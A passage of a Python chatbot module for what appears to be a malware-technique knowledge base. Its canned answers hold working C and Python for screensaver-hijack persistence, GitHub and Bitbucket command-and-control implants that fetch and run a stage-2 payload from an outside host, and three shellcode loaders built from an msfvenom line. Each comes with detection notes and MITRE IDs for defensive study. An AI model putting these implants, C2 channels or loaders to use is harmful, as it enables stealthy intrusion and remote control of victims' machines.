**Detection:** Monitor `Winlogon\\Shell` for comma-separated values or non-`explorer.exe` entries.

---

### 3. Screensaver Hijacking (`malware-pers-4`) - T1546.002

No admin required. Replaces the screensaver binary path in user hive.

```c
RegOpenKeyExA(HKEY_CURRENT_USER,
    "Control Panel\\\\Desktop", 0, KEY_SET_VALUE, &hKey);
// point SCRNSAVE.EXE at payload
RegSetValueExA(hKey, "SCRNSAVE.EXE", 0, REG_SZ,
    (BYTE*)"C:\\\\Users\\\\Public\\\\update.scr",
    strlen("C:\\\\Users\\\\Public\\\\update.scr") + 1);
// ensure screensaver is enabled
RegSetValueExA(hKey, "ScreenSaveActive", 0, REG_SZ,
    (BYTE*)"1", 2);
RegCloseKey(hKey);
```

**Detection:** `Control Panel\\Desktop\\SCRNSAVE.EXE` pointing outside `System32`; Sysmon EID 13.

---

**MITRE:** T1547.001, T1547.004, T1546.002, T1574.001"""
    ),

    # -- GitHub / Bitbucket C2 ------------------------------------------------
    (
        r"github c2|gist|github issue|bitbucket c2|covert channel",
        """## GitHub / Bitbucket Covert C2

Both channels abuse legitimate developer platforms - defenders must block entire services to stop them.

---

### GitHub Issues C2 (`c2-github-1`) - T1102, T1071.001

Operator posts commands as Issue comments; implant polls and parses them.

```c
// implant: GET latest comment on issue #42
// Authorization: token ghp_xxxxxxxxxxxxx

#define GH_ENDPOINT \\
    "https://api.github.com/repos/victim-org/cfg/issues/42/comments"

HINTERNET h = InternetOpenUrlA(hNet, GH_ENDPOINT,
    "Authorization: token ghp_xxx\\r\\n"
    "User-Agent: GitUpdater/1.0\\r\\n",
    -1L, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);

char buf[32768] = {0}; DWORD n = 0;
InternetReadFile(h, buf, sizeof(buf) - 1, &n);
// parse last element's "body" field - exec as shell command or download URL
const char *cmd = json_last_string(buf, "body");
if (cmd && cmd[0] == '!') handle_command(cmd + 1);
```

**Operator posts (Python):**

```python
import requests

HEADERS = {
    "Authorization": "token ghp_xxxxxxxxxxxxx",
    "Accept": "application/vnd.github.v3+json",
}
URL = "https://api.github.com/repos/victim-org/cfg/issues/42/comments"

# send drop command with stage-2 URL
requests.post(URL, headers=HEADERS,
              json={"body": "!drop https://cdn.example.com/s2.exe"})
```

---

### Bitbucket C2 (`c2-bitbucket-1`) - T1102, T1132.001

Implant polls a repo file; operator pushes new payload as a base64-encoded commit.

```c
// base64-encoded "workspace:app_password" in implant config
const char *bb_token_b64 = "d29ya3NwYWNlOnBhc3M="; // obfuscated

// GET latest src/payload.bin from default branch
// Authorization: Basic <bb_token_b64>
const char *url =
    "https://api.bitbucket.org/2.0/repositories/"
    "workspace/cfg-repo/src/main/payload.bin";

// download, base64-decode, write to %TEMP%, execute
```

**MITRE:** T1102 (Web Service), T1071.001 (App Layer), T1132.001 (Base64 Encoding)

**Detection:**
- Periodic `api.github.com` / `api.bitbucket.org` connections from non-developer processes
- Fixed-interval polling (Sysmon EID 3, filter by destination host)
- User-Agent strings that don't match known browsers or `git.exe`
- `Authorization: token` headers in network captures (Zeek/Suricata)"""
    ),

    # -- Shellcode loading -----------------------------------------------------
    (
        r"shellcode|shellcod|shellcoding|msfvenom|payload dropp|loader",
        """## Shellcode Loading Techniques

Three loaders with increasing stealth - from obvious RWX pages to W^X section mapping.

---

### 1. Classic RWX loader (high noise)

```c
#include <windows.h>

// msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c
unsigned char sc[] = "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00...";

int main(void) {
    LPVOID mem = VirtualAlloc(NULL, sizeof(sc),
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);  // RWX - loud
    if (!mem) return 1;
    RtlMoveMemory(mem, sc, sizeof(sc));
    ((void(*)())mem)();   // call shellcode as function pointer
    return 0;
}
```

**Detection:** `VirtualAlloc` with `PAGE_EXECUTE_READWRITE` in a single call - highest signal; most EDRs alert immediately.

---

### 2. W^X loader - write then flip permissions (medium noise)

```c
// 1. Allocate RW - never simultaneously writable AND executable
LPVOID mem = VirtualAlloc(NULL, sizeof(sc),
                          MEM_COMMIT | MEM_RESERVE,
                          PAGE_READWRITE);
memcpy(mem, sc, sizeof(sc));

// 2. Flip to execute-only
DWORD old;
VirtualProtect(mem, sizeof(sc), PAGE_EXECUTE_READ, &old);

// 3. Run on a new thread
HANDLE t = CreateThread(NULL, 0,
               (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
WaitForSingleObject(t, INFINITE);
VirtualFree(mem, 0, MEM_RELEASE);
```

**Detection:** `VirtualAlloc(RW)` immediately followed by `VirtualProtect(RX)` on the same address; medium signal.

---

### 3. NtMapViewOfSection loader - no VirtualAllocEx (low noise)

```c
#include <winternl.h>

// avoids VirtualAllocEx entirely - creates a named section object,
// maps it RW, writes shellcode, remaps as RX
HANDLE    hSection  = NULL;
SIZE_T    viewSize  = 0;
PVOID     base      = NULL;
LARGE_INTEGER sz    = { .QuadPart = sizeof(sc) };

NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sz,
                PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

NtMapViewOfSection(hSection, GetCurrentProcess(), &base,
                   0, sizeof(sc), NULL, &viewSize,
                   ViewShare, 0, PAGE_READWRITE);

memcpy(base, sc, sizeof(sc));

// remap as execute-read (no VirtualProtect call)
NtUnmapViewOfSection(GetCurrentProcess(), base);
NtMapViewOfSection(hSection, GetCurrentProcess(), &base,
                   0, sizeof(sc), NULL, &viewSize,
                   ViewShare, 0, PAGE_EXECUTE_READ);

((void(*)())base)();
```

**MITRE:** T1055 (Process Injection), T1106 (Native API), T1027 (Obfuscated Payload)

**Detection:** `NtCreateSection` + `NtMapViewOfSection` from non-system processes - low noise but catchable via ETW `Microsoft-Windows-Kernel-Memory`; memory integrity scanners walking VAD tree."""
    ),

    # -- AI providers ---------------------------------------------------------
    (
        r"what model|which (llm|model|ai)|ollama model|qwen|provider",
        """## AI Assistant Providers

Switch between providers using the buttons in the chat input bar.

| Provider | Model | Mode | Best for |
|---|---|---|---|
| **Claude** | `claude-opus-4-6` | API, streaming | Best reasoning; extended thinking; full KB cached |
| **Gemini** | `gemini-2.0-flash` | API, streaming | Fast responses; full KB injected as system prompt |
| **Ollama** | `qwen3:1.7b` | Local, offline | Air-gapped demo; RAG over top-6 posts |

### Ollama RAG pipeline

```
User question
     │
     ▼  embed with nomic-embed-text (768-dim)
     │
     ▼  cosine similarity vs all KB post embeddings
     │
     ▼  top-6 most relevant posts selected
     │
     ▼  injected into qwen3:1.7b system prompt
     │
     ▼  streamed answer (/no_think - fast mode)
```

### Claude prompt-cache optimisation

The full knowledge base (~80 k tokens) is sent as a **cached system prompt block** (`cache_control: ephemeral`). It is only billed once per 5-minute TTL window, making multi-turn sessions ~90 % cheaper.

```python
# chatbot.py - how the cache block is constructed
system = [
    {"type": "text", "text": _SYSTEM_BASE},
    {"type": "text", "text": kb_text,
     "cache_control": {"type": "ephemeral"}},  # cached separately
]
```

**To set up:** add keys to `config/anthropic_config.json` or `config/gemini_config.json` in the **Settings** panel. For Ollama: `ollama pull qwen3:1.7b && ollama pull nomic-embed-text`."""
    ),
]


def _canned_response(question: str) -> str:
    import re
    q = question.lower().strip()
    for pattern, answer in _CANNED:
        if re.search(pattern, q):
            return answer
    return ""


def _stream_canned(answer: str) -> Generator[str, None, None]:
    """Yield a canned answer word-by-word to simulate streaming."""
    import time
    words = answer.split(" ")
    chunk = []
    for i, word in enumerate(words):
        chunk.append(word)
        if len(chunk) >= 6 or i == len(words) - 1:
            yield " ".join(chunk) + (" " if i < len(words) - 1 else "")
            chunk = []
            time.sleep(0.015)


# -- public interface -----------------------------------------------------------

def stream_chat(messages: list[dict], provider: str = "claude") -> Generator[str, None, None]:
    """
    Stream a chat response.
    provider: "claude" | "gemini" | "ollama"
    messages: [{role, content}, ...]
    """
    last_user = next((m["content"] for m in reversed(messages) if m.get("role") == "user"), "")
    canned = _canned_response(last_user)
    if canned:
        yield {"status": "canned", "msg": "instant answer"}
        yield from _stream_canned(canned)
        return

    if provider == "gemini":
        yield from _stream_gemini(messages)
    elif provider == "ollama":
        yield from _stream_ollama(messages)
    else:
        yield from _stream_claude(messages)


def has_knowledge_base() -> bool:
    return KB_FILE.exists() and KB_FILE.stat().st_size > 1000


def kb_info() -> dict:
    if not KB_FILE.exists():
        return {"status": "not_indexed", "posts": 0}
    try:
        kb = json.loads(KB_FILE.read_text())
        ts = kb.get("indexed_at", "")
        return {
            "status":       "ready",
            "posts":        kb.get("post_count", 0),
            "indexed_at":   ts,
            "last_updated": ts,
            "source":       kb.get("source", ""),
        }
    except Exception:
        return {"status": "error", "posts": 0}


def providers_status() -> dict:
    """Check which providers are configured."""
    claude_key = _get_anthropic_key()
    gemini_key, gemini_model = _get_gemini_config()
    ollama_ok, ollama_model  = _ollama_available()
    return {
        "claude": {
            "available": bool(claude_key),
            "model":     CLAUDE_MODEL,
        },
        "gemini": {
            "available": bool(gemini_key),
            "model":     gemini_model,
        },
        "ollama": {
            "available": ollama_ok,
            "model":     ollama_model,
        },
    }
